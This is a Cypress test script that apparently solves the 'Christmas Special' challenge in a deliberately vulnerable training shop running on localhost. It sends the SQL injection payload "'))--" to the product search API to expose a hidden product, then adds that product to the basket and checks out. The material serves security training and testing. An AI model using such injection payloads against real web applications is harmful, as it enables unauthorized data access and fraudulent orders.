export function christmasSpecialChallenge() {

  // Send HTTP request with SQL Injection in payload
  // This is a way to verify if this request will be block by a WAF
  const options = {
    method: 'GET',
    url: 'http://localhost:3000/rest/products/search',
    qs: {
      q: "'))--"
    }
  }

  cy.request(options).then((resp) => {
    
    // Extract Christmas Super-Surprise-Box product detail from the catalogue
    var christmasSpecialOffer = resp.body.data.find(o => o.name === 'Christmas Super-Surprise-Box (2014 Edition)');
    
    // Login with cypress account
    cy.signin('cypress@mail.com','cypress');
      
    cy.getCookie('token').then((cookieToken) => {
      
      // Get basket ID
      var basketId = sessionStorage.getItem('bid');

      // Add Christmas Super-Surprise-Box to your basket
      const options = {
        method: 'POST',
        url: '/api/BasketItems',
        body: {
          BasketId: basketId,
          ProductId: christmasSpecialOffer.id,
          quantity: 1
        },
        auth: {
          bearer: cookieToken.value
        }
      }
      
      cy.request(options).then((resp) => {
          
        cy.visit('/#/basket');
        cy.get('#checkoutButton').click();
            
        //Select firt delivery address
        cy.get('.mat-radio-outer-circle').click({ multiple: true, force: true });
        //cy.get('#mat-radio-39 > .mat-radio-label > .mat-radio-container > .mat-radio-outer-circle').click({ force: true });
        cy.get('.btn-next').click();
            
        // Select the firt delivery mode
        //cy.get('#mat-radio-41 > .mat-radio-label > .mat-radio-container > .mat-radio-outer-circle').click({ force: true });
        cy.get('.mat-radio-outer-circle').click({ multiple: true, force: true });
        cy.get('.nextButton').click();
            
        // Select the first credit card
        cy.get('.mat-radio-outer-circle').click({ multiple: true, force: true });
        cy.get('.nextButton').click();
            
        // Confirm checkout
        cy.get('#checkoutButton').click();
            
        // check if challenge is solved
        cy.isSolvedChallenge('christmasSpecialChallenge').should('eq', true);
            
      });
        
    });
        
  });

}
